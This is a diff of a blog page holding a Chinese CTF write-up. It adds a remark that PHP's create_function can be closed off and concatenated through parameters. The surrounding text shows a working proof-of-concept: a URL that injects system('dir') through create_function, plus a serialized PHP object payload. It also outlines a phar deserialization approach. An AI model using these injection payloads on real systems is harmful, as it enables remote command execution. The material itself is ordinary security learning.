@@ -27,7 +27,7 @@
 <meta property="og:description" content="myweb题解这道题目有点可惜，思路是对的，代码那一处少了;导致没执行成功，这里有报错是正常的，代码还是正常执行了的。 先是扫描了一下，发现user.json，给了账号密码，登上去就是一个上传的接口。然后还给了一个读文件的接口&#x2F;show.php?file&#x3D;xxx.jpg，到这里有两个思路:1.图片马 2.phar反序列化。图片马这里是打不通的，因为这里是file_get_content是读文件内容">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-01-06T00:41:50.000Z">
-<meta property="article:modified_time" content="2025-01-11T05:57:18.334Z">
+<meta property="article:modified_time" content="2025-01-11T06:09:07.152Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -201,7 +201,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-01-11 13:57:18" itemprop="dateModified" datetime="2025-01-11T13:57:18+08:00">2025-01-11</time>
+      <time title="Modified: 2025-01-11 14:09:07" itemprop="dateModified" datetime="2025-01-11T14:09:07+08:00">2025-01-11</time>
     </span>
 
   
@@ -245,6 +245,7 @@
 <p>最终的<code>poc</code>:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Collect/index.php?action=\create_function&amp;arg=return;&#125;system(&quot;dir&quot;);//</span><br><span class="line">post传：</span><br><span class="line">      unsafe=O:4:&quot;safe&quot;:1:&#123;s:8:&quot;password&quot;;O:6:&quot;unsafe&quot;:1:&#123;s:8:&quot;username&quot;;i:519651;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
+<p>注意：这里的create_function比较特殊，可以用参数来进行闭合和拼接。其他不行。</p>
 <h1 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy flask"></a>easy flask</h1><p>听说是python的pickle反序列化。待填坑。</p>
 
     </div>
